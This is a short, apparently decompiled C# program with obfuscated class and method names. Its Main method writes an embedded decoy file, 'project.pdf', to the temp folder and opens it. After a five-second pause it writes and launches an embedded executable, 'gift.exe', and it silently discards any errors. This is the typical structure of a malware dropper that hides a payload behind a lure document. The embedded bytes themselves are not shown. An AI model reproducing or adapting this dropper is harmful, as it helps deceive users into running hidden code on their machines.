using System;
using System.Diagnostics;
using System.IO;
using System.Security;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class7
{
	private static object object_0 = Class8.smethod_1();

	private static object object_1 = Class8.smethod_0();

	[STAThread]
	[SecuritySafeCritical]
	public static void Main()
	{
		try
		{
			string text = Path.GetTempPath() + "\\project.pdf";
			File.WriteAllBytes(text, (byte[])object_0);
			Process.Start(text);
			Thread.Sleep(5000);
			string text2 = Path.GetTempPath() + "\\gift.exe";
			File.WriteAllBytes(text2, (byte[])object_1);
			Process.Start(text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
